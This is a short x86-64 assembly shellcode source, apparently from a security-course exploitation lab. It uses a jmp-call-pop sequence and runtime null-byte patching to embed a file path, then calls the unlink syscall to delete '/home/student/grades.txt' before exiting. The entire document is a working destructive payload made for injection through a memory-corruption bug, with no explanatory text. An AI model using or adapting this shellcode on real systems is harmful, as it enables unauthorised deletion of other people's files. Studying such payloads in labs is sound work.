#include <sys/syscall.h>

#define STRING  "/home/student/grades.txt\0"
#define STRLEN  26

.globl main
        .type   main, @function

 main:
        jmp     calladdr

 popladdr:
        popq    %rdi
        xorq    %rax, %rax
        movb    %al, (STRLEN)(%rdi)

        movb    $SYS_unlink,%al
        syscall

        xorq    %rax, %rax
        movb    $SYS_exit, %al
        xorq    %rdi, %rdi
        syscall

 calladdr:
        call    popladdr
        .ascii  STRING
